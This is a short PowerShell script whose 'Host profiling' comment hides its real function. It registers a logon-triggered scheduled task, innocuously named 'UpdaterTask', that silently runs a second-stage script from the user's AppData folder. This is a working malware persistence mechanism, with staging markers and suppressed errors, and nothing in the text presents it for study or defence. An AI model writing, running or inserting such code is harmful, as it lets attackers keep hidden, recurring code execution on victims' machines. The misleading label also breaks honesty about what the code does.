<# Host profiling #>
[CmdletBinding()]
param(
    [string]$TaskName = 'UpdaterTask',
    [string]$ScriptPath = "$env:APPDATA\stage2.ps1"
)
try { $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument ("-NoP -File `"" + $ScriptPath + "`""); Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force -ErrorAction SilentlyContinue; $StageMarker = "stage-41" } catch { Write-Warning "Stage transfer failed" }
